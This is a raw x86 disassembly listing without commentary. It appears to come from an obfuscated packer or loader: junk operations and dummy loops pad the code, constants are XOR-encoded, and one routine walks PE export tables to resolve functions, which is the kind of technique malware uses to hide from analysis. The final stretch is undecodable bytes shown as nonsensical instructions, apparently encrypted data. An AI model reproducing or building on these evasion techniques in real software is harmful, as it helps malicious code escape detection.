  4088cb:	add    eax,ecx
  4088cd:	adc    edx,0xffffffff
  4088d0:	push   esi
  4088d1:	push   edi
  4088d2:	mov    edi,DWORD PTR ds:0x421732
  4088d8:	mov    ebx,DWORD PTR ds:0x42175a
  4088de:	sub    edi,ebx
  4088e0:	or     edi,DWORD PTR [edi+ebx*1]
  4088e3:	mov    edi,edx
  4088e5:	and    DWORD PTR ds:0x429000,0x0
  4088ef:	jmp    0x408901
  4088f4:	mov    edx,DWORD PTR ds:0x429000
  4088fa:	inc    edx
  4088fb:	mov    DWORD PTR ds:0x429000,edx
  408901:	cmp    DWORD PTR ds:0x429000,0x1a
  408908:	jae    0x40895a
  40890e:	cmp    DWORD PTR ds:0x429000,0x7
  408915:	jne    0x40893b
  40891b:	push   DWORD PTR [ebp-0x1c]
  40891e:	push   0x85ec
  408923:	push   0x4f88
  408928:	push   DWORD PTR [ebp-0x10]
  40892b:	push   0x6e2c
  408930:	push   0x428000
  408935:	call   DWORD PTR ds:0x424038
  40893b:	cmp    DWORD PTR ds:0x429000,0x6
  408942:	jne    0x408955
  408948:	mov    edx,DWORD PTR ds:0x429000
  40894e:	inc    edx
  40894f:	mov    DWORD PTR ds:0x429000,edx
  408955:	jmp    0x4088f4
  40895a:	mov    edx,DWORD PTR [ebp+0x8]
  40895d:	adc    DWORD PTR ds:0x42a00c,0x42801c
  408967:	mov    ebx,eax
  408969:	mov    eax,0x8a29a123
  40896e:	xor    esi,esi
  408970:	xor    ebx,eax
  408972:	xor    edi,0x0
  408975:	and    DWORD PTR ds:0x429000,0x1a3f
  40897f:	add    edx,ecx
  408981:	adc    esi,0xffffffff
  408984:	xor    edx,eax
  408986:	xor    esi,0x0
  408989:	cmp    edx,ebx
  40898b:	jne    0x408999
  408991:	cmp    esi,edi
  408993:	je     0x4089c8
  408999:	mov    edx,DWORD PTR ds:0x421912
  40899f:	mov    edx,DWORD PTR [edx+0x1c0]
  4089a5:	mov    edx,DWORD PTR [edx]
  4089a7:	xor    esi,esi
  4089a9:	add    edx,ecx
  4089ab:	adc    esi,0xffffffff
  4089ae:	xor    edx,eax
  4089b0:	xor    esi,0x0
  4089b3:	cmp    edx,0x70941fd1
  4089b9:	jne    0x408a32
  4089bf:	cmp    esi,0xffffffff
  4089c2:	jne    0x408a32
  4089c8:	mov    edx,DWORD PTR ds:0x421996
  4089ce:	mov    esi,DWORD PTR ds:0x42198e
  4089d4:	xor    edx,esi
  4089d6:	mov    DWORD PTR ds:0x42198e,edx
  4089dc:	mov    edx,DWORD PTR [ebp+0xc]
  4089df:	mov    edx,DWORD PTR [edx]
  4089e1:	mov    edx,DWORD PTR [edx]
  4089e3:	mov    esi,DWORD PTR ds:0x42198e
  4089e9:	add    DWORD PTR [edx],esi
  4089eb:	mov    esi,DWORD PTR [ebp+0x8]
  4089ee:	mov    edx,DWORD PTR ds:0x42198e
  4089f4:	xor    esi,0x7510893
  4089fa:	add    esi,0x3272db
  408a00:	xor    ebx,ebx
  408a02:	add    esi,ecx
  408a04:	adc    ebx,0xffffffff
  408a07:	xor    edi,edi
  408a09:	xor    esi,eax
  408a0b:	xor    ebx,0x0
  408a0e:	add    edx,ecx
  408a10:	adc    edi,0xffffffff
  408a13:	xor    edx,eax
  408a15:	xor    edi,0x0
  408a18:	cmp    edx,esi
  408a1a:	jne    0x408a32
  408a20:	cmp    edi,ebx
  408a22:	jne    0x408a32
  408a28:	mov    eax,ds:0x42198e
  408a2d:	mov    ds:0x421996,eax
  408a32:	pop    edi
  408a33:	pop    esi
  408a34:	pop    ebx
  408a35:	pop    ebp
  408a36:	ret    0x8
  408a39:	push   ebp
  408a3a:	mov    ebp,esp
  408a3c:	push   ecx
  408a3d:	mov    eax,ds:0x42175e
  408a42:	mov    eax,DWORD PTR [eax]
  408a44:	add    DWORD PTR ds:0x42901c,eax
  408a4a:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  408a51:	mov    eax,DWORD PTR [ebp+0x8]
  408a54:	adc    DWORD PTR ds:0x42a010,0x6bac
  408a5e:	mov    al,BYTE PTR [eax]
  408a60:	xor    DWORD PTR ds:0x42b018,0x428020
  408a6a:	add    al,0xd
  408a6c:	sbb    DWORD PTR ds:0x428004,0x428008
  408a76:	xor    al,0x6f
  408a78:	mov    DWORD PTR ds:0x428004,0x2e21
  408a82:	cmp    al,0x35
  408a84:	mov    DWORD PTR ds:0x42a00c,0x23cb
  408a8e:	jne    0x408b4b
  408a94:	and    DWORD PTR ds:0x428024,0x429014
  408a9e:	mov    eax,DWORD PTR [ebp+0x8]
  408aa1:	dec    edx
  408aa2:	mov    ecx,DWORD PTR [ebp+0x8]
  408aa5:	and    edx,DWORD PTR ds:0x42b010
  408aab:	add    ecx,DWORD PTR [eax+0x3c]
  408aae:	mov    edx,0x7510893
  408ab3:	mov    DWORD PTR [ebp+0x8],ecx
  408ab6:	and    DWORD PTR ds:0x42c008,0x0
  408ac0:	jmp    0x408ad2
  408ac5:	mov    ecx,DWORD PTR ds:0x42c008
  408acb:	inc    ecx
  408acc:	mov    DWORD PTR ds:0x42c008,ecx
  408ad2:	cmp    DWORD PTR ds:0x42c008,0x18
  408ad9:	jae    0x408b1d
  408adf:	cmp    DWORD PTR ds:0x42c008,0x9
  408ae6:	jne    0x408afc
  408aec:	push   0x429014
  408af1:	push   0x5ace
  408af6:	call   DWORD PTR ds:0x42403c
  408afc:	cmp    DWORD PTR ds:0x42c008,0x8
  408b03:	jne    0x408b18
  408b09:	xor    ecx,ecx
  408b0b:	or     ecx,DWORD PTR ds:0x42c008
  408b11:	inc    ecx
  408b12:	mov    DWORD PTR ds:0x42c008,ecx
  408b18:	jmp    0x408ac5
  408b1d:	mov    eax,DWORD PTR [ebp-0x4]
  408b20:	xor    eax,edx
  408b22:	push   esi
  408b23:	mov    esi,DWORD PTR [ebp+0x8]
  408b26:	mov    ecx,0x3272db
  408b2b:	add    eax,ecx
  408b2d:	cmp    DWORD PTR [esi+0x54],eax
  408b30:	pop    esi
  408b31:	je     0x408b3f
  408b37:	mov    eax,DWORD PTR [ebp+0x8]
  408b3a:	jmp    0x408b58
  408b3f:	mov    eax,DWORD PTR [ebp-0x4]
  408b42:	xor    eax,edx
  408b44:	add    eax,ecx
  408b46:	jmp    0x408b58
  408b4b:	mov    eax,DWORD PTR [ebp-0x4]
  408b4e:	xor    eax,0x7510893
  408b53:	add    eax,0x3272db
  408b58:	leave  
  408b59:	ret    0x4
  408b5c:	push   ebp
  408b5d:	mov    ebp,esp
  408b5f:	sub    esp,0x18
  408b62:	and    DWORD PTR ds:0x42901c,0x0
  408b6c:	jmp    0x408b7e
  408b71:	mov    edx,DWORD PTR ds:0x42901c
  408b77:	inc    edx
  408b78:	mov    DWORD PTR ds:0x42901c,edx
  408b7e:	cmp    DWORD PTR ds:0x42901c,0x1a
  408b85:	jae    0x408bb7
  408b8b:	cmp    DWORD PTR ds:0x42901c,0x22
  408b92:	jne    0x408ba8
  408b98:	push   0x8447
  408b9d:	push   0x4235a4
  408ba2:	call   DWORD PTR ds:0x424040
  408ba8:	jmp    0x408b71
  408bad:	adc    DWORD PTR ds:0x42b010,0x42b00c
  408bb7:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  408bbe:	mov    ecx,DWORD PTR ds:0x42172a
  408bc4:	mov    ecx,DWORD PTR [ecx]
  408bc6:	and    DWORD PTR ds:0x42c01c,ecx
  408bcc:	lea    eax,[ebp+0x14]
  408bcf:	mov    DWORD PTR [ebp-0x4],eax
  408bd2:	push   esi
  408bd3:	and    DWORD PTR ds:0x428018,0x0
  408bdd:	jmp    0x408bef
  408be2:	mov    esi,DWORD PTR ds:0x428018
  408be8:	inc    esi
  408be9:	mov    DWORD PTR ds:0x428018,esi
  408bef:	cmp    DWORD PTR ds:0x428018,0x1a
  408bf6:	jae    0x408cc4
  408bfc:	cmp    DWORD PTR ds:0x428018,0x28
  408c03:	jne    0x408c14
  408c09:	push   0x4235bf
  408c0e:	call   DWORD PTR ds:0x424044
  408c14:	jmp    0x408be2
  408c19:	and    DWORD PTR ds:0x42c000,0x0
  408c23:	mov    edx,DWORD PTR ds:0x42c000
  408c29:	inc    edx
  408c2a:	mov    DWORD PTR ds:0x42c000,edx
  408c30:	cmp    DWORD PTR ds:0x42c000,0x20
  408c37:	jne    0x408c52
  408c3d:	push   0x1ea1
  408c42:	push   0x42b008
  408c47:	push   0x423682
  408c4c:	call   DWORD PTR ds:0x424048
  408c52:	cmp    DWORD PTR ds:0x42c000,0x11
  408c59:	jb     0x408c23
  408c5f:	and    DWORD PTR ds:0x42b004,0x0
  408c69:	mov    edx,DWORD PTR ds:0x42b004
  408c6f:	inc    edx
  408c70:	mov    DWORD PTR ds:0x42b004,edx
  408c76:	cmp    DWORD PTR ds:0x42b004,0xf
  408c7d:	jne    0x408c93
  408c83:	push   0x428004
  408c88:	push   0x7cc5
  408c8d:	call   DWORD PTR ds:0x424014
  408c93:	cmp    DWORD PTR ds:0x42b004,0xe
  408c9a:	jne    0x408cad
  408ca0:	mov    edx,DWORD PTR ds:0x42b004
  408ca6:	inc    edx
  408ca7:	mov    DWORD PTR ds:0x42b004,edx
  408cad:	cmp    DWORD PTR ds:0x42b004,0x1d
  408cb4:	jb     0x408c69
  408cba:	mov    DWORD PTR ds:0x428014,0x22a8
  408cc4:	mov    esi,0xf89c85b6
  408cc9:	and    DWORD PTR ds:0x428008,0x0
  408cd3:	mov    edx,DWORD PTR ds:0x428008
  408cd9:	inc    edx
  408cda:	mov    DWORD PTR ds:0x428008,edx
  408ce0:	cmp    DWORD PTR ds:0x428008,0x19
  408ce7:	jne    0x408d17
  408ced:	push   0x62e7
  408cf2:	push   0x428000
  408cf7:	push   0x75f3
  408cfc:	push   0x428000
  408d01:	push   DWORD PTR [ebp-0x24]
  408d04:	push   0x6458
  408d09:	push   DWORD PTR [ebp-0x14]
  408d0c:	push   0x5743
  408d11:	call   DWORD PTR ds:0x424018
  408d17:	cmp    DWORD PTR ds:0x428008,0x14
  408d1e:	jb     0x408cd3
  408d24:	xor    ecx,ecx
  408d26:	add    ecx,DWORD PTR ds:0x429008
  408d2c:	adc    DWORD PTR ds:0x42c00c,ecx
  408d32:	mov    DWORD PTR [ebp-0xc],esi
  408d35:	lea    eax,[ebp-0xc]
  408d38:	dec    ecx
  408d39:	mov    DWORD PTR [ebp-0x14],eax
  408d3c:	mov    eax,DWORD PTR [ebp-0xc]
  408d3f:	adc    ecx,0x29e6
  408d45:	mov    edx,DWORD PTR [ebp-0x14]
  408d48:	and    DWORD PTR ds:0x428018,0x0
  408d52:	mov    ecx,DWORD PTR ds:0x428018
  408d58:	inc    ecx
  408d59:	mov    DWORD PTR ds:0x428018,ecx
  408d5f:	cmp    DWORD PTR ds:0x428018,0xb
  408d66:	jne    0x408d77
  408d6c:	push   0x4faf
  408d71:	call   DWORD PTR ds:0x42401c
  408d77:	cmp    DWORD PTR ds:0x428018,0xa
  408d7e:	jne    0x408d91
  408d84:	mov    ecx,DWORD PTR ds:0x428018
  408d8a:	inc    ecx
  408d8b:	mov    DWORD PTR ds:0x428018,ecx
  408d91:	cmp    DWORD PTR ds:0x428018,0x1e
  408d98:	jb     0x408d52
  408d9e:	inc    ecx
  408d9f:	mov    ecx,0x7510893
  408da4:	neg    DWORD PTR ds:0x42a004
  408daa:	xor    eax,ecx
  408dac:	add    eax,0x3272db
  408db1:	and    DWORD PTR ds:0x42c010,0x2759
  408dbb:	mov    DWORD PTR [edx],eax
  408dbd:	mov    edx,DWORD PTR ds:0x421722
  408dc3:	mov    eax,ds:0x421732
  408dc8:	sub    edx,eax
  408dca:	and    edx,DWORD PTR [edx+eax*1]
  408dcd:	mov    eax,ds:0x42178a
  408dd2:	inc    DWORD PTR ds:0x42a01c
  408dd8:	mov    edx,DWORD PTR [ebp-0x4]
  408ddb:	and    DWORD PTR ds:0x42a018,0x7b9c
  408de5:	mov    eax,DWORD PTR [eax]
  408de7:	and    DWORD PTR ds:0x42c000,0x5f81
  408df1:	add    eax,DWORD PTR [edx]
  408df3:	movzx  edx,BYTE PTR ds:0x42a014
  408dfa:	or     DWORD PTR ds:0x42a01c,edx
  408e00:	push   edi
  408e01:	add    DWORD PTR ds:0x42a004,edx
  408e07:	mov    DWORD PTR [ebp-0x8],eax
  408e0a:	movzx  edx,WORD PTR ds:0x428004
  408e11:	sbb    DWORD PTR ds:0x42a01c,edx
  408e17:	mov    edi,DWORD PTR [ebp+0x8]
  408e1a:	and    DWORD PTR ds:0x42b01c,0x631e
  408e24:	mov    eax,ds:0x421912
  408e29:	mov    eax,DWORD PTR [eax+0x198]
  408e2f:	xor    edi,ecx
  408e31:	mov    DWORD PTR ds:0x428018,0x14
  408e3b:	cmp    DWORD PTR ds:0x428018,0x0
  408e42:	je     0x408e95
  408e48:	cmp    DWORD PTR ds:0x428018,0x3
  408e4f:	jne    0x408e63
  408e55:	push   DWORD PTR [ebp-0x28]
  408e58:	push   0x77dc
  408e5d:	call   DWORD PTR ds:0x424020
  408e63:	cmp    DWORD PTR ds:0x428018,0x4
  408e6a:	jne    0x408e7d
  408e70:	mov    edx,DWORD PTR ds:0x428018
  408e76:	dec    edx
  408e77:	mov    DWORD PTR ds:0x428018,edx
  408e7d:	mov    edx,DWORD PTR ds:0x428018
  408e83:	dec    edx
  408e84:	mov    DWORD PTR ds:0x428018,edx
  408e8a:	jmp    0x408e3b
  408e8f:	and    DWORD PTR ds:0x42c014,ecx
  408e95:	mov    edx,0x3272db
  408e9a:	sbb    DWORD PTR ds:0x429008,0x451c
  408ea4:	add    edi,edx
  408ea6:	mov    DWORD PTR ds:0x42a000,0x2432
  408eb0:	cmp    DWORD PTR [eax],edi
  408eb2:	je     0x408ebf
  408eb8:	mov    eax,DWORD PTR [eax]
  408eba:	jmp    0x409144
  408ebf:	mov    eax,DWORD PTR [ebp+0x18]
  408ec2:	cmp    eax,esi
  408ec4:	jne    0x408ede
  408eca:	mov    DWORD PTR ds:0x42a01c,0x2296
  408ed4:	push   0xf89c85b5
  408ed9:	jmp    0x409133
  408ede:	mov    esi,DWORD PTR [ebp+0x18]
  408ee1:	mov    eax,0x2f4e
  408ee6:	mov    eax,0xf89c85b4
  408eeb:	cmp    esi,eax
  408eed:	jne    0x409123
  408ef3:	sbb    esi,esi
  408ef5:	mov    eax,DWORD PTR [ebp+0x10]
  408ef8:	mov    esi,DWORD PTR ds:0x42c008
  408efe:	sbb    esi,DWORD PTR ds:0x42a008
  408f04:	mov    DWORD PTR ds:0x42c008,esi
  408f0a:	xor    eax,ecx
  408f0c:	mov    DWORD PTR ds:0x428000,0x1b
  408f16:	cmp    DWORD PTR ds:0x428000,0x0
  408f1d:	je     0x408f86
  408f23:	cmp    DWORD PTR ds:0x428000,0x4
  408f2a:	jne    0x408f5a
  408f30:	push   0x42a000
  408f35:	push   0x8ffd
  408f3a:	push   DWORD PTR [ebp-0x14]
  408f3d:	push   0x428014
  408f42:	push   0x2d9f
  408f47:	push   0x4236fc
  408f4c:	push   0x4cf3
  408f51:	push   DWORD PTR [ebp-0x1c]
  408f54:	call   DWORD PTR ds:0x424024
  408f5a:	cmp    DWORD PTR ds:0x428000,0x5
  408f61:	jne    0x408f74
  408f67:	mov    esi,DWORD PTR ds:0x428000
  408f6d:	dec    esi
  408f6e:	mov    DWORD PTR ds:0x428000,esi
  408f74:	mov    esi,DWORD PTR ds:0x428000
  408f7a:	dec    esi
  408f7b:	mov    DWORD PTR ds:0x428000,esi
  408f81:	jmp    0x408f16
  408f86:	add    eax,edx
  408f88:	mov    DWORD PTR [ebp-0x18],eax
  408f8b:	mov    eax,DWORD PTR [ebp+0xc]
  408f8e:	mov    esi,DWORD PTR [ebp-0x8]
  408f91:	xor    eax,ecx
  408f93:	add    eax,edx
  408f95:	imul   eax,DWORD PTR [esi]
  408f98:	mov    esi,DWORD PTR [ebp+0x8]
  408f9b:	xor    esi,ecx
  408f9d:	add    esi,edx
  408f9f:	cmp    esi,eax
  408fa1:	mov    eax,DWORD PTR [ebp-0x4]
  408fa4:	push   ebx
  408fa5:	je     0x408fc4
  408fab:	mov    esi,DWORD PTR [ebp-0x18]
  408fae:	add    DWORD PTR [eax],esi
  408fb0:	mov    eax,DWORD PTR [ebp-0x4]
  408fb3:	mov    esi,DWORD PTR [ebp+0xc]
  408fb6:	xor    esi,ecx
  408fb8:	add    esi,edx
  408fba:	imul   esi,DWORD PTR [eax]
  408fbd:	mov    DWORD PTR [eax],esi
  408fbf:	jmp    0x408fc9
  408fc4:	mov    esi,DWORD PTR [ebp+0x14]
  408fc7:	xor    DWORD PTR [eax],esi
  408fc9:	mov    eax,DWORD PTR [ebp-0x4]
  408fcc:	mov    edi,DWORD PTR [ebp+0x10]
  408fcf:	xor    edi,ecx
  408fd1:	mov    esi,0xffcd8d25
  408fd6:	mov    ebx,esi
  408fd8:	sub    ebx,edi
  408fda:	add    DWORD PTR [eax],ebx
  408fdc:	mov    eax,DWORD PTR [ebp-0x4]
  408fdf:	mov    edi,DWORD PTR [ebp-0x8]
  408fe2:	add    edi,DWORD PTR [eax]
  408fe4:	mov    DWORD PTR [ebp-0x8],edi
  408fe7:	mov    eax,DWORD PTR [ebp+0xc]
  408fea:	mov    edi,DWORD PTR [ebp+0xc]
  408fed:	xor    edi,ecx
  408fef:	xor    eax,ecx
  408ff1:	lea    eax,[eax+edi*1+0x64e5b6]
  408ff8:	mov    edi,DWORD PTR [ebp+0xc]
  408ffb:	xor    edi,ecx
  408ffd:	add    edi,edx
  408fff:	imul   eax,edi
  409002:	mov    edi,DWORD PTR [ebp+0xc]
  409005:	xor    edi,ecx
  409007:	sub    edi,eax
  409009:	mov    eax,DWORD PTR [ebp-0x4]
  40900c:	add    edi,edx
  40900e:	cmp    DWORD PTR [eax],edi
  409010:	mov    eax,DWORD PTR [ebp-0x4]
  409013:	mov    edi,DWORD PTR [ebp+0x10]
  409016:	jg     0x409029
  40901c:	xor    edi,ecx
  40901e:	mov    ebx,esi
  409020:	sub    ebx,edi
  409022:	add    DWORD PTR [eax],ebx
  409024:	jmp    0x40902f
  409029:	xor    edi,ecx
  40902b:	add    edi,edx
  40902d:	add    DWORD PTR [eax],edi
  40902f:	mov    eax,DWORD PTR [ebp-0x8]
  409032:	mov    edi,DWORD PTR [ebp-0x10]
  409035:	mov    eax,DWORD PTR [eax]
  409037:	xor    edi,ecx
  409039:	add    edi,0x3272da
  40903f:	not    edi
  409041:	and    eax,edi
  409043:	movsx  di,BYTE PTR [eax+0x1]
  409048:	mov    ebx,0x3b4b
  40904d:	sub    di,bx
  409050:	mov    ebx,0x8a85
  409055:	xor    di,bx
  409058:	mov    ebx,0x4f8a
  40905d:	cmp    di,bx
  409060:	jne    0x409088
  409066:	movsx  di,BYTE PTR [eax]
  40906a:	mov    ebx,0x3b4b
  40906f:	sub    di,bx
  409072:	mov    ebx,0x8a85
  409077:	xor    di,bx
  40907a:	mov    ebx,0x4f87
  40907f:	cmp    di,bx
  409082:	je     0x409098
  409088:	mov    edi,DWORD PTR [ebp-0x10]
  40908b:	xor    edi,ecx
  40908d:	mov    ebx,esi
  40908f:	sub    ebx,edi
  409091:	add    eax,ebx
  409093:	jmp    0x409043
  409098:	mov    esi,DWORD PTR [ebp-0x14]
  40909b:	mov    esi,DWORD PTR [esi]
  40909d:	mov    edi,DWORD PTR [eax+0x3c]
  4090a0:	lea    esi,[edi+esi*8+0x78]
  4090a4:	mov    esi,DWORD PTR [esi+eax*1]
  4090a7:	mov    DWORD PTR [ebp-0x8],esi
  4090aa:	mov    esi,DWORD PTR [ebp+0x8]
  4090ad:	xor    esi,ecx
  4090af:	add    esi,edx
  4090b1:	mov    DWORD PTR [ebp-0x14],esi
  4090b4:	mov    esi,DWORD PTR [ebp+0x8]
  4090b7:	mov    edi,DWORD PTR [ebp-0x8]
  4090ba:	xor    esi,ecx
  4090bc:	add    esi,edx
  4090be:	pop    ebx
  4090bf:	cmp    edi,esi
  4090c1:	jne    0x4090df
  4090c7:	mov    eax,DWORD PTR [ebp+0xc]
  4090ca:	xor    eax,ecx
  4090cc:	mov    ecx,DWORD PTR [ebp-0x8]
  4090cf:	add    eax,edx
  4090d1:	imul   eax,ecx
  4090d4:	mov    DWORD PTR [ebp-0x8],eax
  4090d7:	push   DWORD PTR [ebp+0x18]
  4090da:	jmp    0x409133
  4090df:	mov    ecx,DWORD PTR [ebp-0x8]
  4090e2:	add    ecx,eax
  4090e4:	mov    DWORD PTR [ebp-0x14],ecx
  4090e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4090ea:	mov    ecx,DWORD PTR [ecx+0xc]
  4090ed:	movsx  cx,BYTE PTR [ecx+eax*1]
  4090f2:	mov    edx,0x3b4b
  4090f7:	sub    cx,dx
  4090fa:	mov    edx,0x8a85
  4090ff:	xor    cx,dx
  409102:	mov    edx,0x4f85
  409107:	cmp    cx,dx
  40910a:	jne    0x4090d7
  409110:	mov    ecx,DWORD PTR ds:0x421912
  409116:	mov    ecx,DWORD PTR [ecx+0x198]
  40911c:	mov    DWORD PTR [ecx],eax
  40911e:	jmp    0x409144
  409123:	mov    ecx,DWORD PTR [ebp+0x18]
  409126:	cmp    ecx,0xf89c85b5
  40912c:	jne    0x409144
  409132:	push   eax
  409133:	push   DWORD PTR [ebp+0x14]
  409136:	push   DWORD PTR [ebp+0x10]
  409139:	push   DWORD PTR [ebp+0xc]
  40913c:	push   DWORD PTR [ebp+0x8]
  40913f:	call   0x408b5c
  409144:	pop    edi
  409145:	pop    esi
  409146:	leave  
  409147:	ret    0x14
  40914a:	push   ebp
  40914b:	mov    ebp,esp
  40914d:	push   ecx
  40914e:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  409155:	mov    eax,DWORD PTR [ebp-0x4]
  409158:	mov    ecx,DWORD PTR ds:0x42b010
  40915e:	sbb    DWORD PTR ds:0x42a018,ecx
  409164:	mov    edx,DWORD PTR [ebp+0x10]
  409167:	mov    DWORD PTR ds:0x42801c,0x4950
  409171:	mov    ecx,0x7510893
  409176:	sbb    DWORD PTR ds:0x428028,0x4a48
  409180:	xor    eax,ecx
  409182:	add    DWORD PTR ds:0x42b000,0x42800c
  40918c:	add    eax,0x3272db
  409191:	mov    DWORD PTR ds:0x42a014,0x169
  40919b:	mov    DWORD PTR [edx],eax
  40919d:	sbb    eax,edx
  40919f:	mov    eax,DWORD PTR [ebp+0xc]
  4091a2:	xor    eax,ecx
  4091a4:	inc    edx
  4091a5:	push   esi
  4091a6:	xor    esi,edx
  4091a8:	mov    esi,DWORD PTR [ebp+0x10]
  4091ab:	mov    edx,0x3272db
  4091b0:	add    eax,edx
  4091b2:	add    DWORD PTR ds:0x42b01c,0x428020
  4091bc:	mov    DWORD PTR [esi+0x4],eax
  4091bf:	mov    eax,DWORD PTR [ebp+0x14]
  4091c2:	mov    esi,DWORD PTR ds:0x428024
  4091c8:	sbb    esi,DWORD PTR ds:0x429010
  4091ce:	mov    DWORD PTR ds:0x428024,esi
  4091d4:	mov    esi,DWORD PTR [ebp+0x10]
  4091d7:	mov    DWORD PTR [esi+0x8],eax
  4091da:	mov    eax,DWORD PTR [ebp+0x18]
  4091dd:	mov    esi,DWORD PTR [ebp+0x10]
  4091e0:	mov    DWORD PTR [esi+0xc],eax
  4091e3:	mov    eax,DWORD PTR [ebp+0x1c]
  4091e6:	mov    esi,DWORD PTR [ebp+0x10]
  4091e9:	mov    DWORD PTR [esi+0x10],eax
  4091ec:	mov    eax,DWORD PTR [ebp+0x8]
  4091ef:	xor    eax,ecx
  4091f1:	add    eax,edx
  4091f3:	pop    esi
  4091f4:	leave  
  4091f5:	ret    0x18
  4091f8:	push   ebp
  4091f9:	mov    ebp,esp
  4091fb:	sub    esp,0x94
  409201:	mov    eax,DWORD PTR [ebp+0x8]
  409204:	push   ebx
  409205:	neg    ecx
  409207:	jmp    0x40b57c
  40920c:	mov    dl,0xcf
  40920e:	enter  0x872f,0x27
  409212:	imul   ebp,DWORD PTR [edi+0x65],0x1fd7ebdc
  409219:	test   BYTE PTR [ebp+0x6218a7a9],0x62
  409220:	or     bl,BYTE PTR [edi+0x62]
  409223:	(bad)  
  409224:	retf   
  409225:	adc    eax,0x7b2e9f0e
  40922a:	or     esi,ebx
  40922c:	cdq    
  40922d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40922e:	imul   cl
  409230:	adc    eax,0xb2c3042b
  409235:	sbb    BYTE PTR [edx+0x4cc7e092],al
  40923b:	push   edi
  40923c:	jmp    0x4dc168e2
  409241:	add    DWORD PTR [esp+ecx*4-0x75c69921],edx
  409248:	leave  
  409249:	inc    edx
  40924a:	add    al,BYTE PTR [edx+0xc]
  40924d:	dec    edi
  40924e:	sbb    edi,DWORD PTR [edx]
  409250:	retf   
  409251:	call   0xc095:0x6e3da19b
  409258:	int3   
  409259:	and    esp,ebx
  40925b:	mov    al,ds:0xe7075810
  409260:	xlat   BYTE PTR ds:[ebx]
  409261:	xor    DWORD PTR [ebp+0x5b7d354],ebp
  409267:	mov    al,ds:0x320c1b2c
  40926c:	call   0xa9606223
  409271:	outs   dx,BYTE PTR ds:[esi]
  409272:	popf   
  409273:	mov    al,ds:0x883af02b
  409278:	cmp    ebx,edi
  40927a:	jb     0x40924e
  40927c:	shl    BYTE PTR [ebx+0x50],1
  40927f:	mov    ebx,0xe72e714f
  409284:	cwde   
  409285:	test   DWORD PTR [ebp+0x25f71cd8],eax
  40928b:	pop    esi
  40928c:	(bad)  
  40928d:	xchg   edx,eax
  40928e:	fdecstp 
  409290:	test   eax,0xf84c8b58
  409295:	pop    ebx
  409296:	ins    DWORD PTR es:[edi],dx
  409297:	sub    eax,0x9e7543e8
  40929c:	pusha  
  40929d:	pop    es
  40929e:	xchg   ecx,eax
  40929f:	fnsave [esi+0x6a]
  4092a2:	out    0xb8,al
  4092a4:	cmp    dh,BYTE PTR [ecx+0x13480204]
  4092aa:	imul   esp,edx,0xffffff90
  4092ad:	scas   al,BYTE PTR es:[edi]
  4092ae:	fisttp QWORD PTR [ebx-0x45d0fb27]
  4092b4:	sahf   
  4092b5:	add    cl,BYTE PTR [ecx-0x66e8462f]
  4092bb:	xor    bl,BYTE PTR [esi+esi*1-0x2c]
  4092bf:	ret    
  4092c0:	xor    esp,DWORD PTR [eax+0x40]
  4092c3:	das    
  4092c4:	inc    esi
  4092c5:	mov    DWORD PTR [ecx],edx
  4092c7:	xchg   esp,eax
  4092c8:	or     eax,0xb1fd956f
  4092cd:	retf   0x6fb7
  4092d0:	dec    esi
  4092d1:	xchg   edx,eax
  4092d2:	cmc    
  4092d3:	mov    ch,0xba
  4092d5:	jp     0x4092fd
  4092d7:	jp     0x409284
  4092d9:	sub    al,0x51
  4092db:	ror    BYTE PTR [edx+0x5d],cl
  4092de:	pop    edx
  4092df:	ret    0x740b
  4092e2:	xor    al,BYTE PTR [edi+0x5dcdf907]
  4092e8:	xchg   ecx,eax
  4092e9:	pop    edx
  4092ea:	push   edx
  4092eb:	mov    esi,DWORD PTR [eax-0x49]
  4092ee:	xchg   ebx,eax
  4092ef:	pop    ebp
  4092f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092f1:	pop    eax
  4092f2:	dec    edi
  4092f3:	push   esi
  4092f4:	sti    
  4092f5:	in     eax,dx
  4092f6:	inc    ebx
  4092f7:	or     eax,0xd9d95472
  4092fc:	xor    ecx,DWORD PTR [edx-0x6e1c2ca1]
  409302:	xor    DWORD PTR [ebp+eiz*2+0x3f],0x3d28ce19
  40930a:	out    0x48,eax
  40930c:	inc    edx
  40930d:	pushf  
  40930e:	in     eax,0xfd
  409310:	sub    dl,bh
  409312:	fdivr  QWORD PTR [eax-0x533289ff]
  409318:	mov    al,0x21
  40931a:	fdivr  QWORD PTR [ebx+0x69]
  40931d:	dec    ebx
  40931e:	adc    DWORD PTR [ebx+0x4],ecx
  409321:	push   di
  409323:	rcr    DWORD PTR [esi-0x12330ade],0x74
  40932a:	aaa    
  40932b:	pop    esi
  40932c:	mov    esi,DWORD PTR [edi]
  40932e:	jl     0x4092e5
  409330:	retf   0x657e
  409333:	and    al,0x8a
  409335:	fadd   QWORD PTR [ebp-0x41]
  409338:	dec    eax
  409339:	lock shr DWORD PTR [ebx],0x37
  40933d:	pushf  
  40933e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40933f:	xlat   BYTE PTR ds:[ebx]
  409340:	push   ecx
  409341:	adc    eax,0x936d4654
  409346:	xor    BYTE PTR ds:0x87b1c384,cl
  40934c:	ja     0x409372
  40934e:	and    eax,0xe74552d0
  409353:	mov    ebp,0x1e6d5cbc
  409358:	imul   ecx,DWORD PTR [eax+0x66],0x60ac5e4
  40935f:	dec    edi
  409360:	pop    ebp
  409361:	or     BYTE PTR [eax+0x3f],dl
  409364:	retf   0xafef
  409367:	inc    ebx
  409368:	jb     0x40934a
  40936a:	adc    ebx,DWORD PTR [esi+edx*1]
  40936d:	retf   
  40936e:	lock push 0xffffffd7
  409371:	aad    0x1b
  409373:	and    ah,al
  409375:	cmp    bh,BYTE PTR [esi]
  409377:	mov    al,0x40
  409379:	(bad)  
  40937a:	push   0x6988f6c8
  40937f:	xchg   edx,eax
  409380:	nop
  409381:	mov    WORD PTR [esi],?
  409383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409384:	fld    st(7)
  409386:	xchg   edx,eax
  409387:	mov    esi,0x7933dde7
  40938c:	xchg   BYTE PTR [edx-0x63],dl
  40938f:	sub    al,0xbe
  409391:	mov    dh,BYTE PTR [ebp+ebx*8+0x15]
  409395:	or     dh,cl
  409397:	neg    DWORD PTR ds:0xbc90fa83
  40939d:	js     0x40934a
